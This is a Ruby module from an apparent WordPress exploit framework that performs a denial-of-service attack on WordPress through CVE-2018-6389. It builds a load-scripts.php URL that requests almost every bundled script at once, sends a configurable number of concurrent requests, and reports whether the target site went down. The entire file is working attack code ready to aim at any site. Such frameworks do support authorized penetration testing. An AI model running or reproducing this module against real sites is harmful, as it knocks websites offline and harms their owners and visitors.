# frozen_string_literal: true

class Wpxf::Auxiliary::LoadScriptsDos < Wpxf::Module
  include Wpxf
  include Wpxf::Net::HttpClient

  def initialize
    super

    update_info(
      name: 'WordPress "load-scripts.php" DoS',
      desc: %(
        All versions of WordPress, as of March, 2018, are vulnerable to a
        denial of service attack by making large amounts of requests to the
        load-scripts.php file. This module allows users to configure a maximum
        number of requests (via `max_requests`), and the number of threads to
        use (`max_http_concurrency`) and will execute the requests and then
        check the status of the website.
      ),
      author: [
        'Barak Tawily', # Vulnerability disclosure
        'rastating'     # WPXF module
      ],
      references: [
        ['CVE', '2018-6389'],
        ['WPVDB', '9021'],
        ['URL', 'https://baraktawily.blogspot.co.uk/2018/02/how-to-dos-29-of-world-wide-websites.html']
      ],
      date: 'Feb 05 2018'
    )

    register_options([
      IntegerOption.new(
        name: 'max_requests',
        required: true,
        desc: 'Max number of requests to send',
        default: 200
      ),
      IntegerOption.new(
        name: 'http_client_timeout',
        desc: 'Max wait time in seconds for HTTP responses',
        default: 5,
        required: true
      )
    ])
  end

  def max_requests
    normalized_option_value('max_requests')
  end

  def check
    wordpress_and_online? ? :vulnerable : :unknown
  end

  def vulnerable_url
    normalize_uri(
      full_uri,
      'wp-admin',
      'load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,'\
      'wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,'\
      'wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,'\
      'scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound'\
      ',scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,'\
      'jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,'\
      'jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,'\
      'jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate'\
      ',jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,'\
      'jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,'\
      'jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu'\
      ',jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,'\
      'jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,'\
      'jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color'\
      ',schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,'\
      'jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject'\
      ',moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers'\
      ',comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect'\
      ',mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement'\
      ',wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,'\
      'wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,'\
      'language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent'\
      ',customize-base,customize-loader,customize-preview,customize-models,customize-views,'\
      'customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets'\
      ',customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models'\
      ',wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox'\
      ',tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,'\
      'media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,'\
      'custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,'\
      'wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,'\
      'custom-header,custom-background,media-gallery,svg-painter&ver=4.9.1'
    )
  end

  def setup_requests
    opts = {
      url: vulnerable_url,
      method: :get
    }

    self.complete_requests = 0
    max_requests.times do
      queue_request(opts) do |_res|
        self.complete_requests += 1
        emit_warning("#{complete_requests} requests executed") if (complete_requests % 10).zero?
      end
    end
  end

  def run
    return false unless super

    emit_info "Preparing #{max_requests} requests..."
    setup_requests

    emit_info "Beginning execution of #{max_requests} requests over #{max_http_concurrency} threads"
    execute_queued_requests
    emit_success 'Finished executing requests'

    if wordpress_and_online?
      emit_error "FAILED: #{full_uri} appears to still be online"
      return false
    else
      emit_success "#{full_uri} appears to be down"
      return true
    end
  end

  attr_accessor :complete_requests
end
